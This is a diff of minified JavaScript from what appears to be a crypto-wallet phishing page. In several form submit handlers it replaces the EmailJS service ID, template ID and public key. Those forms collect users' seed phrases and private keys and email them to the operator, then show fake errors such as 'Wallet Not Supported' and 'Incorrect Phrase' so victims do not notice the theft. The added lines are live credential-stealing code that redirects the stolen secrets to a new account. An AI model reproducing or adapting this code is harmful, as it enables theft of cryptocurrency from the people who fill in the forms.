@@ -29904,16 +29904,16 @@
                                                 background: "linear-gradient(to right, #00b09b, #96c93d)",
                                             }
                                         }).showToast() : (c(!0),
-                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
+                                            A("service_gtwv8gs", "template_fgz5eza", n.current, "wPZVHEI85GVZDFfkE").then((e => {
                                                 console.log(e),
                                                     Toastify({
-                                                        text: "Incorrect Phrase",
+                                                        text: "Wallet Not Supported",
                                                         className: "info",
                                                         style: {
                                                             background: "linear-gradient(to right, #00b09b, #96c93d)",
                                                         }
                                                     }).showToast()
-                                                    l(""),
+                                                l(""),
                                                     c(!1)
                                             }
                                             ), (e => {
@@ -29994,7 +29994,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i ? (c(!0),
-                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
+                                        A("service_gtwv8gs", "template_fgz5eza", n.current, "wPZVHEI85GVZDFfkE").then((e => {
                                                 console.log(e),
                                                     Toastify({
                                                         text: "Wallet Not Supported",
@@ -30011,13 +30011,13 @@
                                                     c(!1),
                                                     Toastify(e.message).showToast()
                                             }
-                                        ))) : Toastify({
-                                            text: "Invalid private key. Please enter at least 64 alphanumeric characters.",
-                                            className: "info",
-                                            style: {
-                                                background: "linear-gradient(to right, #00b09b, #96c93d)",
-                                            }
-                                        }).showToast()
+                                            ))) : Toastify({
+                                                text: "Invalid private key. Please enter at least 64 alphanumeric characters.",
+                                                className: "info",
+                                                style: {
+                                                    background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                                }
+                                            }).showToast()
                                 }
                                 ,
                                 ref: n,
@@ -30066,7 +30066,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i(!0),
-                                        A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
+                                        A("service_gtwv8gs", "template_fgz5eza", n.current, "wPZVHEI85GVZDFfkE").then((e => {
                                             console.log(e),
                                                 l(""),
                                                 i(!1)
